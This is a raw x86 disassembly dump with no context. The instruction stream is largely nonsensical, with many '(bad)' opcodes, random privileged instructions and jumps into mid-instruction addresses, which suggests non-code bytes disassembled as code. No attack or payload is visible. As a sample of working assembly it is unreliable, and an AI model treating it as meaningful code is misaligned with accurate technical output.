  430f2a:	pop    es
  430f2b:	mov    edi,eax
  430f2d:	in     eax,dx
  430f2e:	(bad)  
  430f2f:	call   ecx
  430f31:	push   esi
  430f33:	int3   
  430f34:	mov    BYTE PTR [ecx],al
  430f36:	add    bh,bh
  430f38:	mov    dl,0xff
  430f3a:	pop    ecx
  430f3b:	call   FWORD PTR [edx+0x76ff83bb]
  430f41:	sub    DWORD PTR [edi],0xffffff83
  430f44:	and    eax,DWORD PTR ds:[eax]
  430f47:	call   DWORD PTR [ecx+ecx*4+0x67d200ac]
  430f4e:	add    DWORD PTR [eax],0xffffffcd
  430f51:	add    BYTE PTR [edi+0x0],bh
  430f54:	jg     0x430f44
  430f56:	add    bh,bh
  430f58:	in     eax,0xff
  430f5a:	mov    edx,0xff9466ff
  430f5f:	mov    DWORD PTR [ebp+0x0],eax
  430f62:	mov    ah,0x83
  430f64:	adc    ebp,edi
  430f66:	mov    edi,edi
  430f68:	loope  0x430f69
  430f6a:	cmc    
  430f6b:	push   esi
  430f6d:	repz inc DWORD PTR [eax]
  430f70:	sti    
  430f71:	(bad)  
  430f72:	fild   WORD PTR [ebx+0xff43ee]
  430f78:	sar    bh,1
  430f7a:	fadd   QWORD PTR [ebx-0x33c186]
  430f80:	ja     0x430f81
  430f82:	fadd   QWORD PTR [eax]
  430f84:	sbb    BYTE PTR [esi],dl
  430f86:	cmp    edi,0x49
  430f89:	call   FWORD PTR [ecx+0x10e000]
  430f8f:	jmp    DWORD PTR [eax+eax*1]
  430f92:	add    al,0x83
  430f94:	es inc esi
  430f96:	inc    DWORD PTR [eax]
  430f98:	lea    ecx,[ecx-0x703f00b5]
  430f9e:	dec    DWORD PTR [ecx+0xfd009a]
  430fa4:	xor    dh,BYTE PTR [esi-0x7c750100]
  430faa:	das    
  430fab:	(bad)  
  430fac:	jmp    0xa242102d
  430fb1:	(bad)  
  430fb2:	fadd   DWORD PTR [ebx-0xddde]
  430fb8:	sbb    al,BYTE PTR [ebx+0xd4ff59]
  430fbe:	(bad)  
  430fbf:	inc    DWORD PTR [ebp+0x58ffccff]
  430fc5:	jmp    0xfff3:0x518300
  430fcc:	shr    BYTE PTR ds:0xcc598983,cl
  430fd2:	dec    esp
  430fd3:	(bad)  
  430fd4:	fild   WORD PTR [eax+eax*1-0x1]
  430fd8:	sbb    bh,bh
  430fda:	clc    
  430fdb:	add    BYTE PTR [edi],dh
  430fdd:	sar    bh,cl
  430fdf:	add    BYTE PTR [edi+edi*8+0x4f648368],dh
  430fe6:	inc    DWORD PTR [eax]
  430fe8:	(bad)  
  430fe9:	sub    DWORD PTR [esi-0x77],0x5d
  430fed:	adc    eax,0xcceb00ff
  430ff2:	sub    eax,0x7d8500
  430ff7:	push   eax
  430ff9:	mov    DWORD PTR [ecx-0x33867600],esi
  430fff:	add    BYTE PTR [ebx],al
  431001:	adc    DWORD PTR [ebx-0x1],0xffffff9a
  431005:	clc    
  431006:	dec    DWORD PTR [ecx+0xae003b]
  43100c:	mov    ds:0xa2ff009e,eax
  431011:	dec    ecx
  431013:	call   DWORD PTR [ebp-0x7d]
  431016:	inc    DWORD PTR [eax]
  431018:	fdivr  st,st(7)
  43101a:	int    0x83
  43101c:	ret    0xff99
  43101f:	call   FWORD PTR [eax+0x58fffbff]
  431025:	fild   DWORD PTR [eax]
  431027:	int3   
  431028:	outs   dx,BYTE PTR ds:[esi]
  431029:	(bad)  
  43102a:	mov    ebx,0x83bab300
  43102f:	(bad)  
  431030:	cmp    BYTE PTR [ebx-0x2c68004a],al
  431036:	mov    esp,ecx
  431038:	(bad)  
  431039:	inc    DWORD PTR [ecx-0x1]
  43103c:	iret   
  43103d:	add    BYTE PTR [ebx+0x2cff5683],al
  431043:	dec    DWORD PTR [ebx+eiz*8]
  431046:	(bad)  
  431047:	call   edi
  431049:	and    DWORD PTR [ebx+eax*4],0xffffffa1
  43104d:	bound  eax,QWORD PTR [eax]
  43104f:	call   FWORD PTR [ecx]
  431051:	call   DWORD PTR [edi-0x5f9c01]
  431057:	add    DWORD PTR [ecx],0xffffff89
  43105a:	retf   0x84ff
  43105d:	mov    al,0x83
  43105f:	int3   
  431060:	adc    BYTE PTR [eax],al
  431062:	push   0x94c183
  431067:	jmp    DWORD PTR [edx-0x187c0200]
  43106d:	push   ebp
  43106e:	add    BYTE PTR [eax],al
  431070:	test   bh,bh
  431072:	fcmovne st,st(4)
  431074:	ror    BYTE PTR [esi-0x6b007d],1
  43107a:	mov    cl,BYTE PTR [ecx+0xaf08]
  431080:	data16 add BYTE PTR [eax+eax*1+0x6a],ch
  431085:	pop    edi
  431086:	add    BYTE PTR [eax],al
  431088:	hlt    
  431089:	int3   
  43108a:	jl     0x43100f
  43108c:	out    0x6c,eax
  43108e:	inc    DWORD PTR [eax]
  431090:	hlt    
  431091:	add    BYTE PTR ds:0x89d187cc,dl
  431097:	sbb    DWORD PTR [eax+0x0],0xffffffb2
  43109b:	add    ah,dh
  43109d:	inc    DWORD PTR [eax]
  43109f:	add    BYTE PTR [edx+0x4ff4bff],ah
  4310a5:	dec    esi
  4310a6:	(bad)  
  4310a7:	inc    ebp
  4310a9:	add    BYTE PTR [ebx],ch
  4310ab:	add    BYTE PTR [ecx+eax*8],cl
  4310ae:	add    bh,bh
  4310b0:	xor    al,BYTE PTR [eax]
  4310b2:	out    0xff,al
  4310b4:	push   ebp
  4310b5:	push   edi
  4310b6:	add    bh,bh
  4310b8:	idiv   bh
  4310ba:	rol    BYTE PTR [eax],1
  4310bc:	push   ebx
  4310bd:	imul   edi,edi,0xffffffff
  4310c0:	pop    ebp
  4310c1:	add    BYTE PTR [ecx-0x7d],bl
  4310c4:	dec    esp
  4310c5:	int    0x0
  4310c7:	add    dl,dl
  4310c9:	add    BYTE PTR [eax],dl
  4310cb:	(bad)  
  4310cc:	fstp   QWORD PTR [eax]
  4310ce:	mov    DWORD PTR [eax],eax
  4310d0:	pop    ds
  4310d1:	mov    esi,ebp
  4310d3:	jmp    FWORD PTR [edi-0x9007ce8]
  4310d9:	int3   
  4310da:	retf   0x2d83
  4310dd:	bound  eax,QWORD PTR [ebx-0x60006701]
  4310e3:	(bad)  
  4310e4:	ficom  DWORD PTR [ecx+0x78ff89]
  4310ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4310eb:	(bad)  
  4310ec:	js     0x431085
  4310ee:	inc    DWORD PTR [ebx-0x2a767c]
  4310f4:	cmp    bh,BYTE PTR ds:0xff58ccff
  4310fa:	fild   DWORD PTR [eax]
  4310fc:	adc    eax,0x8ecc00aa
  431101:	call   FWORD PTR [esi-0x2fb001]
  431107:	dec    DWORD PTR [edi-0x1]
  43110a:	sar    bh,1
  43110c:	xchg   ebp,eax
  43110d:	(bad)  
  43110e:	dec    DWORD PTR [ecx-0x7cf47c46]
  431114:	sub    al,0xe1
  431116:	int3   
  431117:	push   DWORD PTR [edi]
  431119:	add    BYTE PTR [ebp-0x88c101],bh
  43111f:	mov    DWORD PTR [ecx],ebp
  431121:	cmp    DWORD PTR [ebx-0x34],0x4b
  431125:	jno    0x431126
  431127:	add    BYTE PTR [edx],dh
  431129:	add    BYTE PTR [esi-0x1],dh
  43112c:	fidivr DWORD PTR [ecx]
  43112e:	(bad)  
  43112f:	inc    DWORD PTR [esi-0x367c3901]
  431135:	rol    BYTE PTR [eax],cl
  431137:	xor    DWORD PTR [eax],0xffffffff
  43113a:	js     0x43113b
  43113c:	cwde   
  43113d:	xor    DWORD PTR [eax],eax
  43113f:	dec    ebx
  431141:	push   DWORD PTR [eax+eax*1+0x63]
  431145:	(bad)  
  431146:	int3   
  431147:	jmp    FWORD PTR [ebx+0x13009eff]
  43114d:	scas   al,BYTE PTR es:[edi]
  43114e:	dec    DWORD PTR [ecx+0xb200dd]
  431154:	mov    ch,BYTE PTR [eax-0xd70001]
  43115a:	inc    ebx
  43115b:	dec    DWORD PTR ds:0x27ff83a1
  431161:	or     DWORD PTR [ecx-0xc66500],0xffffff83
  431168:	test   al,0x0
  43116a:	aas    
  43116b:	push   DWORD PTR ds:0xfd00008f
  431171:	jmp    FWORD PTR [ebx-0xc3801]
  431177:	cmp    DWORD PTR [edx-0x267cf834],0xffffffc0
  43117e:	inc    DWORD PTR [ebx-0x3315ffb9]
  431184:	and    BYTE PTR [ebp+0x940089],ch
  43118a:	and    bh,bh
  43118c:	mov    ch,ah
  43118e:	dec    esp
  431190:	push   ss
  431191:	mov    DWORD PTR [edx],ecx
  431193:	push   DWORD PTR [edx+0x57]
  431196:	dec    esp
  431198:	and    DWORD PTR [ebx+0x51658964],eax
  43119e:	dec    esp
  4311a0:	scas   al,BYTE PTR es:[edi]
  4311a1:	int3   
  4311a2:	outs   dx,DWORD PTR ds:[esi]
  4311a3:	add    BYTE PTR [ebx],al
  4311a5:	push   cs
  4311a6:	inc    DWORD PTR [eax]
  4311a8:	lock xor DWORD PTR [eax+0xce7000],0xffffffff
  4311b0:	inc    esp
  4311b1:	jmp    FWORD PTR [edx]
  4311b3:	add    BYTE PTR [edi],cl
  4311b5:	and    cl,BYTE PTR [ecx-0x41ffda01]
  4311bb:	jmp    DWORD PTR [eiz*4+0xfcff00]
  4311c2:	inc    esi
  4311c3:	call   eax
  4311c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311c6:	(bad)  
  4311c7:	call   DWORD PTR [ebp-0x1]
  4311ca:	and    al,BYTE PTR [eax]
  4311cc:	cmp    al,0x23
  4311ce:	inc    DWORD PTR [eax]
  4311d0:	test   al,0xff
  4311d2:	retf   
  4311d3:	add    BYTE PTR [ecx+0x7],bh
  4311d6:	cmp    edi,0xffffffb5
  4311d9:	(bad)  
  4311da:	inc    DWORD PTR [ebx-0x7c7c409c]
  4311e0:	stos   DWORD PTR es:[edi],eax
  4311e1:	inc    esi
  4311e3:	int3   
  4311e4:	jp     0x4311c0
  4311e6:	add    BYTE PTR [eax],al
  4311e8:	jp     0x4311e9
  4311ea:	adc    eax,0xff867f83
  4311ef:	(bad)  
  4311f0:	cli    
  4311f1:	add    bl,dh
  4311f3:	add    BYTE PTR ds:0xb6ff00ff,bh
  4311f9:	(bad)  
  4311fa:	cld    
  4311fb:	mov    DWORD PTR [eax+0x77ffff06],ecx
  431201:	call   DWORD PTR [ebp+0x0]
  431204:	ret    
  431205:	jb     0x431207
  431207:	dec    DWORD PTR [ecx]
  431209:	add    cl,cl
  43120b:	add    ah,ah
  43120d:	pop    esi
  43120e:	dec    esp
  431210:	retf   0x50ff
  431213:	inc    DWORD PTR [eax+0x37ffff04]
  431219:	dec    DWORD PTR [eax]
  43121b:	add    BYTE PTR [ebp+0x79898337],al
  431221:	add    BYTE PTR [esi],ch
  431223:	(bad)  
  431224:	cmp    ebx,DWORD PTR [edi+edi*8+0x0]
  431228:	pushf  
  431229:	int3   
  43122a:	call   0xd500:0x89378f00
  431231:	mov    DWORD PTR [ecx-0x337b1b00],esp
  431237:	inc    ecx
  431239:	add    BYTE PTR [esi],bh
  43123b:	inc    DWORD PTR [edi-0x31]
  43123e:	dec    DWORD PTR [ecx-0xb60084]
  431244:	push   edx
  431245:	out    0xff,al
  431247:	mov    edx,esp
  431249:	add    BYTE PTR [edx],dh
  43124b:	jmp    DWORD PTR [edx-0xf33006b]
  431251:	xor    ecx,0x0
  431254:	or     DWORD PTR [ebx+0x0],ebx
  431257:	add    BYTE PTR [ebp-0x64004d01],cl
  43125d:	sub    edi,edi
  43125f:	or     DWORD PTR [esi],0xffffffff
  431262:	cdq    
  431263:	call   FWORD PTR [ecx+0x200ffe3]
  431269:	mov    esi,edx
  43126b:	jmp    FWORD PTR [ebx+edi*1-0xbbff01]
  431272:	cld    
  431273:	jmp    DWORD PTR [ebp+0x6b]
  431276:	(bad)  
  431277:	(bad)  
  431278:	mov    ecx,0xf1ccb200
  43127d:	inc    edi
  43127e:	int3   
  43127f:	(bad)  
  431280:	stc    
  431281:	inc    DWORD PTR [edi-0x77]
  431284:	xor    BYTE PTR [ebx],ch
  431286:	cmp    edi,0xffffffcb
  431289:	add    BYTE PTR [ebx],ah
  43128b:	sub    DWORD PTR ds:0xa4cc00ee,0xffffffff
  431292:	rol    BYTE PTR [ebx-0x767cc0fe],1
  431298:	aaa    
  431299:	(bad)  
  43129a:	fld    QWORD PTR [eax]
  43129c:	jg     0x4312d7
  43129e:	cmp    edi,0xffffffac
  4312a1:	mov    ebx,ebx
  4312a3:	dec    eax
  4312a5:	idiv   edi
  4312a7:	call   edx
  4312a9:	sub    edx,0xffffffff
  4312ac:	mov    bh,0x3
  4312ae:	inc    DWORD PTR [eax]
  4312b0:	add    DWORD PTR [eax],0x1b
  4312b3:	call   ebx
  4312b5:	outs   dx,DWORD PTR ds:[esi]
  4312b6:	add    ah,cl
  4312b8:	mov    bl,0x0
  4312ba:	jl     0x43123f
  4312bc:	jp     0x43125f
  4312be:	add    bh,bh
  4312c0:	adc    al,0xff
  4312c2:	fdiv   st(7),st
  4312c4:	sbb    al,0x5a
  4312c6:	inc    DWORD PTR [ebx-0x5cffae]
  4312cc:	add    bh,BYTE PTR [edx-0xaf3400]
  4312d2:	je     0x4312d3
  4312d4:	jecxz  0x431314
  4312d6:	or     esp,0xffffffa3
  4312d9:	add    BYTE PTR [esi+0xae4bcc],al
  4312df:	call   DWORD PTR [ecx]
  4312e1:	jmp    DWORD PTR [eax+eax*1]
  4312e4:	test   al,0x4
  4312e6:	add    bh,bh
  4312e8:	in     eax,0xff
  4312ea:	mov    edx,0xcc417fff
  4312ef:	add    dh,dl
  4312f1:	add    BYTE PTR [ecx-0x1],bh
  4312f4:	xchg   BYTE PTR [edi-0x23ff01],dl
  4312fa:	sbb    BYTE PTR [ebx-0x7c00f226],al
  431300:	arpl   WORD PTR [ebx-0x47d600e7],ax
  431306:	add    BYTE PTR [eax],al
  431308:	add    bh,bh
  43130a:	inc    eax
  43130b:	add    al,cl
  43130d:	and    esp,ecx
  43130f:	int3   
  431310:	xchg   ecx,eax
  431311:	jmp    FWORD PTR [ecx]
  431313:	inc    eax
  431315:	rol    DWORD PTR [ebx+0x40030ff],1
  43131b:	add    dh,bh
  43131d:	fdivr  st,st(7)
  43131f:	inc    DWORD PTR [ebp+0x3e893800]
  431325:	inc    DWORD PTR ss:[ebx+0x90095]
  43132c:	cs pushf 
  43132e:	add    DWORD PTR [eax],0xffffffd2
  431331:	add    ch,dl
  431333:	add    BYTE PTR [ecx],ch
  431335:	(bad)  
  431336:	(bad)  
  431337:	(bad)  
  431338:	cli    
  431339:	dec    DWORD PTR [esi-0x9da901]
  43133f:	call   eax
  431341:	cmp    DWORD PTR [ecx],0xffffff83
  431344:	pop    ds
  431345:	and    al,0x0
  431347:	add    BYTE PTR [eax+eax*1-0xdf800e8],ch
  43134e:	dec    esp
  431350:	popf   
  431351:	jmp    DWORD PTR ds:0xff6eaa00
  431357:	add    BYTE PTR [edi+edi*8-0x11b5ff11],bh
  43135e:	(bad)  
  43135f:	jmp    DWORD PTR [ebx]
  431361:	inc    DWORD PTR [edi-0x7d]
  431364:	cmp    ecx,edx
  431366:	mov    DWORD PTR [eax],eax
  431368:	enter  0xec83,0x89
  43136c:	pop    edi
  43136d:	in     eax,dx
  43136e:	dec    esp
  431370:	pop    esi
  431371:	add    BYTE PTR [esi-0x387977],ah
  431377:	jmp    FWORD PTR [edi-0x66002000]
  43137d:	mov    bl,0x0
  43137f:	(bad)  
  431380:	inc    DWORD PTR [eax]
  431382:	out    0xff,eax
  431384:	std    
  431385:	and    al,BYTE PTR [eax]
  431387:	jmp    FWORD PTR [ecx+ecx*4-0x320e336b]
  43138e:	(bad)  
  43138f:	dec    DWORD PTR [edi+0x0]
  431392:	cmp    bh,bh
  431394:	push   0xf8cc00fb
  431399:	add    DWORD PTR [ebx-0x1],0xffffffaa
  43139d:	fcos   
  43139f:	jmp    edx
  4313a1:	mov    DWORD PTR [ecx],ebx
  4313a3:	push   ebx
  4313a5:	push   ebp
  4313a6:	add    bh,bh
  4313a8:	jne    0x4313aa
  4313aa:	add    al,0xff
  4313ac:	div    esi
  4313ae:	(bad)  
  4313af:	dec    DWORD PTR [eax+eax*1+0x5d24ff2c]
  4313b6:	add    bh,bh
  4313b8:	sti    
  4313b9:	call   DWORD PTR [eax]
  4313bb:	mov    DWORD PTR [esi-0x71],ecx
  4313be:	add    BYTE PTR [eax],al
  4313c0:	aaa    
  4313c1:	push   ebp
  4313c3:	call   FWORD PTR [ebx]
  4313c5:	inc    edx
  4313c6:	(bad)  
  4313c7:	call   FWORD PTR [edi-0x34]
  4313ca:	retf   0xbdff
  4313cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4313ce:	add    bh,bh
  4313d0:	jle    0x4313d1
  4313d2:	push   es
  4313d3:	mov    DWORD PTR [ecx-0x4f],ebx
  4313d6:	add    bh,bh
  4313d8:	sub    DWORD PTR [eax],eax
  4313da:	xchg   edi,edi
  4313dc:	mov    cl,ch
  4313de:	inc    DWORD PTR [eax]
  4313e0:	in     al,dx
  4313e1:	inc    DWORD PTR [ebp-0x76f48100]
  4313e7:	call   edx
  4313e9:	(bad)  
  4313ea:	cld    
  4313eb:	inc    ebx
  4313ed:	inc    edi
  4313ee:	mov    DWORD PTR [eax],eax
  4313f0:	clc    
  4313f1:	int3   
  4313f2:	xchg   esp,ecx
  4313f4:	std    
  4313f5:	aad    0xff
  4313f7:	(bad)  
  4313f8:	cmp    eax,0x4b839a83
  4313fd:	jge    0x4313fe
  4313ff:	jmp    edx
  431401:	jmp    FWORD PTR [eax-0x823c00]
  431407:	call   DWORD PTR [ecx-0x12009b01]
  43140d:	imul   edi,edi,0xffffff89
  431410:	cwde   
  431411:	jmp    DWORD PTR [edi-0x1]
  431414:	push   cs
  431415:	push   0x96ff89
  43141a:	outs   dx,DWORD PTR ds:[esi]
  43141b:	jmp    FWORD PTR [esi+ebp*2+0x0]
  43141f:	(bad)  
  431420:	stc    
  431421:	sbb    edx,0xffffffff
  431424:	in     eax,0x18
  431426:	int3   
  431427:	jmp    FWORD PTR [edi]
  431429:	add    cl,cl
  43142b:	jmp    FWORD PTR [ebx+0x3c008309]
  431431:	mov    esi,eax
  431433:	dec    DWORD PTR [esi+edx*8]
  431436:	add    DWORD PTR [eax],0x13
  431439:	add    BYTE PTR [edi+edi*8+0x1a],ah
  43143d:	push   cs
  43143e:	add    bh,bh
  431440:	int    0xff
  431442:	sub    eax,0x8993e2ff
  431447:	or     DWORD PTR [edi],0xffffff89
  43144a:	in     al,dx
  43144b:	push   DWORD PTR [esi]
  43144d:	je     0x43144f
  43144f:	mov    DWORD PTR [edi+edi*8-0x1b],eax
  431453:	adc    DWORD PTR [edx],0x7d
  431456:	dec    esp
  431458:	call   0x27c64c5d
  43145d:	sub    eax,0xd6cc00
  431462:	mov    dl,0xff
  431464:	aam    0x53
  431466:	add    bh,bh
  431468:	cwde   
  431469:	call   DWORD PTR [edi-0x1]
  43146c:	mov    esp,0x10830055
  431471:	int3   
  431472:	inc    eax
  431473:	jmp    FWORD PTR [ecx+0x45]
  431476:	add    bh,bh
  431478:	cli    
  431479:	add    BYTE PTR [eax],cl
  43147b:	jmp    FWORD PTR [esi+ebp*4]
  43147e:	mov    DWORD PTR [eax],eax
  431480:	mov    dh,0xff
  431482:	mov    edi,0x83347eff
  431487:	cmp    DWORD PTR [edi+edi*8+0x7f],0xffffffff
  43148c:	push   ecx
  43148d:	ins    BYTE PTR es:[edi],dx
  43148e:	inc    DWORD PTR [ebx-0x76eb00f8]
  431494:	jl     0x431498
  431496:	inc    DWORD PTR [eax]
  431498:	push   esi
  431499:	sbb    DWORD PTR [edi],0x0
  43149c:	scas   eax,DWORD PTR es:[edi]
  43149d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43149e:	(bad)  
  43149f:	dec    edx
  4314a1:	push   DWORD PTR [eax+eax*1+0x7a]
  4314a5:	and    al,BYTE PTR [eax]
  4314a7:	(bad)  
  4314a8:	cmp    eax,0x330019cc
  4314ad:	(bad)  
  4314ae:	inc    DWORD PTR [eax]
  4314b0:	sub    al,0x83
  4314b2:	dec    esp
  4314b3:	inc    edi
  4314b5:	and    edi,edi
  4314b7:	add    BYTE PTR [esi-0x35000901],dl
  4314bd:	xchg   edi,eax
  4314be:	add    bh,bh
  4314c0:	ins    BYTE PTR es:[edi],dx
  4314c1:	call   FWORD PTR [ebx-0x786e01]
  4314c7:	dec    DWORD PTR [ebx+0x6e00b1ff]
  4314cd:	or     bh,bh
  4314cf:	push   ebp
  4314d1:	add    BYTE PTR [edi-0x7d],ch
  4314d4:	ret    
  4314d5:	ins    BYTE PTR es:[edi],dx
  4314d6:	(bad)  
  4314d7:	jmp    DWORD PTR [ebx+eax*4]
  4314da:	into   
  4314db:	add    BYTE PTR [edi],bh
  4314dd:	jg     0x4314de
  4314df:	inc    DWORD PTR [ebx-0x7d]
  4314e2:	nop
  4314e3:	int3   
  4314e4:	and    BYTE PTR [bp+di+0x7400],al
  4314e9:	jmp    DWORD PTR [eax]
  4314eb:	(bad)  
  4314ec:	fsub   st(5),st
  4314ee:	add    ah,cl
  4314f0:	test   DWORD PTR [eax],eax
  4314f2:	pop    edi
  4314f3:	jmp    DWORD PTR [esi+0xf]
  4314f6:	(bad)  
  4314f7:	(bad)  
  4314f8:	(bad)  
  4314fa:	in     eax,0x0
  4314fc:	arpl   WORD PTR [eax+eax*1],cx
  4314ff:	int3   
  431500:	push   0x1289ed83
  431505:	jmp    0xce1509
  43150a:	add    bh,bh
  43150c:	adc    DWORD PTR [ebx],esp
  43150e:	inc    DWORD PTR [eax]
  431510:	xchg   edi,edi
  431512:	mov    edi,edi
  431514:	sub    dh,ah
  431516:	(bad)  
  431517:	(bad)  
  431518:	cld    
  431519:	or     DWORD PTR [ebx],0x0
  43151c:	nop
  43151d:	jnp    0x43151f
  43151f:	inc    DWORD PTR [edx]
  431521:	int3   
  431522:	pop    ebx
  431523:	(bad)  
  431524:	fimul  DWORD PTR ds:0xff978383
  43152a:	call   0x83f23fb8
  43152f:	add    BYTE PTR [edi-0x68ff9a34],ah
  431535:	add    al,BYTE PTR [ebx-0x16006d7d]
  43153b:	add    BYTE PTR [ecx+edx*2+0x63b78300],bh
  431542:	lods   al,BYTE PTR ds:[esi]
  431543:	add    bh,bh
  431545:	in     eax,dx
  431546:	add    al,ah
  431548:	(bad)  
  431549:	(bad)  
  43154a:	push   DWORD PTR [esi-0xfffd8d]
  431550:	into   
  431551:	mov    edx,0x9a00838a
  431556:	dec    esp
  431558:	(bad)  
  431559:	inc    DWORD PTR [eax]
  43155b:	mov    ds:0xff94b8,eax
  431560:	mov    edx,0xffffabde
  431565:	pushf  
  431566:	(bad)  
  431567:	fmul   st,st(4)
  431569:	add    DWORD PTR [eax],0x75
  43156c:	das    
  43156d:	(bad)  
  43156e:	(bad)  
  43156f:	(bad)  
  431570:	cmp    al,BYTE PTR [eax+0x52ffff69]
  431576:	mov    DWORD PTR [edx],esi
  431578:	mov    edi,edi
  43157a:	(bad)  
  43157b:	cmp    ecx,DWORD PTR [ecx+edx*1+0x0]
  43157f:	int3   
  431580:	aas    
  431581:	push   edx
  431582:	inc    DWORD PTR ss:[ebx+0xeb89d3]
  431589:	add    bh,bh
  43158b:	pop    ecx
  43158c:	call   0xe14314c6
  431591:	mov    esp,0xf7ffff57
  431596:	adc    DWORD PTR [eax+eax*1-0x77],0xffffff83
  43159b:	test   eax,0xff571d
  4315a0:	pop    edx
  4315a1:	adc    DWORD PTR [ebp-0x34],esp
  4315a4:	add    BYTE PTR [edi+edi*8-0x4d],bl
  4315a8:	add    BYTE PTR [eax],al
  4315aa:	jmp    DWORD PTR [ecx]
  4315ac:	push   ss
  4315ad:	sti    
  4315ae:	add    BYTE PTR [ecx-0x7660019f],cl
  4315b4:	sub    DWORD PTR [ebx-0x1],0x25
  4315b8:	inc    DWORD PTR [eax]
  4315ba:	int3   
  4315bb:	dec    ecx
  4315bc:	or     eax,0xa2ff83f3
  4315c1:	mov    ah,0x6d
  4315c3:	add    bh,bh
  4315c5:	lods   eax,DWORD PTR ds:[esi]
  4315c6:	and    DWORD PTR [eax],0x0
  4315c9:	add    BYTE PTR [ebx-0x10349d],al
  4315cf:	add    BYTE PTR [edx+edi*4-0x39003391],dh
  4315d6:	call   edi
  4315d8:	(bad)  
  4315d9:	(bad)  
  4315da:	dec    DWORD PTR [edi-0x27]
  4315dd:	sub    bh,bh
  4315df:	inc    esp
  4315e1:	or     eax,0x8100ff27
  4315e6:	jmp    ecx
  4315e8:	inc    DWORD PTR [eax]
  4315ea:	call   DWORD PTR [ecx]
  4315ec:	cli    
  4315ed:	pop    esp
  4315ee:	add    bh,bh
  4315f0:	stos   DWORD PTR es:[edi],eax
  4315f1:	xor    DWORD PTR [edi+edi*8],edx
  4315f4:	inc    DWORD PTR [esi]
  4315f6:	call   edi
  4315f8:	add    BYTE PTR [eax],al
  4315fa:	dec    DWORD PTR [edi+0x3c]
  4315fd:	cmp    eax,0x84f1cccc
  431602:	add    edi,edi
  431604:	call   esp
  431606:	add    al,bh
  431608:	dec    esp
  43160a:	sub    DWORD PTR [esi],0xffffffaa
  43160d:	or     al,0xcc
  43160f:	jmp    DWORD PTR [eax+0x3aea]
  431615:	ud0    eax,ebp
  431618:	(bad)  
  431619:	(bad)  
  43161a:	inc    DWORD PTR [esi]
  43161c:	(bad)  
  43161d:	repnz add bh,bh
  431620:	push   esi
  431621:	retf   
  431622:	test   al,0xff
  431624:	int3   
  431625:	(bad)  
  431626:	call   DWORD PTR [ecx+0x33008300]
  43162c:	jg     0x431659
  43162e:	(bad)  
  43162f:	push   esp
  431631:	sbb    al,BYTE PTR ds:0xc6ff83
  431637:	xchg   DWORD PTR [eax],eax
  431639:	inc    DWORD PTR [eax]
  43163b:	xor    al,0x95
  43163d:	dec    edx
  43163e:	inc    DWORD PTR [eax]
  431640:	popa   
  431641:	ja     0x4316a6
  431643:	(bad)  
  431644:	push   DWORD PTR [esi]
  431646:	call   ebp
  431648:	add    BYTE PTR [ebx+0x5d860083],al
  43164e:	add    bh,bh
  431650:	std    
  431651:	jmp    0x5cff:0x3c00000e
  431658:	add    DWORD PTR [eax],0xffffffcc
  43165b:	pop    edi
  43165c:	test   DWORD PTR [esi],ebx
  43165e:	inc    DWORD PTR [eax]
  431660:	jmp    0x431692
  431662:	mov    esi,0xff9b8989
  431667:	cmp    bh,bh
  431669:	inc    DWORD PTR [eax]
  43166b:	cdq    
  43166c:	sub    DWORD PTR [eax-0x1],edx
  43166f:	inc    DWORD PTR [ecx-0xc375]
  431675:	pop    edx
  431676:	int3   
  431677:	jno    0x431602
  431679:	inc    DWORD PTR [eax]
  43167b:	rcl    DWORD PTR [eax-0x6],cl
  43167e:	(bad)  
  43167f:	push   edi
  431681:	hlt    
  431682:	pop    edx
  431683:	add    BYTE PTR [ebx+0x7ff28],al
  431689:	dec    DWORD PTR [ecx-0x7c553bf7]
  43168f:	(bad)  
  431690:	stc    
  431691:	cwde   
  431692:	mov    eax,DWORD PTR [eax]
  431694:	cmp    DWORD PTR [edi+edi*8+0x99],0x48
  43169c:	pop    es
  43169d:	jecxz  0x43169e
  43169f:	inc    ebp
  4316a1:	push   di
  4316a3:	int3   
  4316a4:	and    DWORD PTR [ebx+eax*4-0x30],0x0
  4316a9:	add    BYTE PTR [eax],al
  4316ab:	pop    edx
  4316ac:	std    
  4316ad:	ds (bad) 
  4316af:	(bad)  
  4316b0:	jp     0x4316ad
  4316b2:	jmp    0x4316b4
  4316b4:	call   DWORD PTR ds:0x8383d2ff
  4316ba:	add    dl,bh
  4316bc:	mov    ebx,0x92ff83fa
  4316c1:	jns    0x4316bb
  4316c3:	(bad)  
  4316c4:	(bad)  
  4316c5:	out    dx,eax
  4316c6:	add    BYTE PTR [esi+0x0],bh
  4316c9:	add    BYTE PTR [eax],al
  4316cb:	rol    BYTE PTR [ebp+esi*2+0x0],1
  4316cf:	xor    esi,0xc
  4316d2:	aaa    
  4316d3:	dec    esp
  4316d5:	cmp    al,0xff
  4316d7:	mov    eax,ds:0x190000ff
  4316dc:	paddw  mm1,mm4
  4316df:	add    BYTE PTR [esp+eiz*2],dh
  4316e2:	cs int3 
  4316e4:	push   DWORD PTR [esi]
  4316e6:	call   ebx
  4316e8:	add    DWORD PTR [eax],0x0
  4316eb:	daa    
  4316ec:	mov    al,0x10
  4316ee:	add    bh,bh
  4316f0:	jecxz  0x4316d5
  4316f2:	(bad)  
  4316f3:	(bad)  
  4316f4:	call   DWORD PTR [ebx+eax*4]
  4316f7:	mov    esp,0xe10000ff
  4316fc:	add    al,0x72
  4316fe:	cmp    edi,0xffffffa8
  431701:	gs push edi
  431703:	mov    edi,edi
  431705:	push   ebp
  431706:	inc    esp
  431708:	mov    DWORD PTR [ebx+0x701848ff],eax
  43170e:	inc    DWORD PTR [eax]
  431710:	push   esi
  431711:	lock sub al,BYTE PTR [eax]
  431714:	and    DWORD PTR [ebx],0xffffffff
  431717:	jno    0x431718
  431719:	inc    DWORD PTR [ebx-0x53252a]
  43171f:	(bad)  
  431720:	jmp    0x42c2b4
  431725:	in     al,0x0
  431727:	cdq    
  431728:	inc    DWORD PTR [ebx-0x67612f00]
  43172e:	(bad)  
  43172f:	(bad)  
  431730:	std    
  431731:	cld    
  431732:	xchg   BYTE PTR [ecx-0x65003101],cl
  431738:	inc    DWORD PTR [eax]
  43173a:	add    BYTE PTR [ecx-0x7602],dl
  431740:	sbb    bh,bh
  431742:	inc    edx
  431743:	mov    esp,ecx
  431745:	add    cl,ah
  431747:	(bad)  
  431748:	int3   
  431749:	inc    DWORD PTR [ebx+0x23acf4]
  43174f:	(bad)  
  431750:	mov    ebp,0xffff3ff5
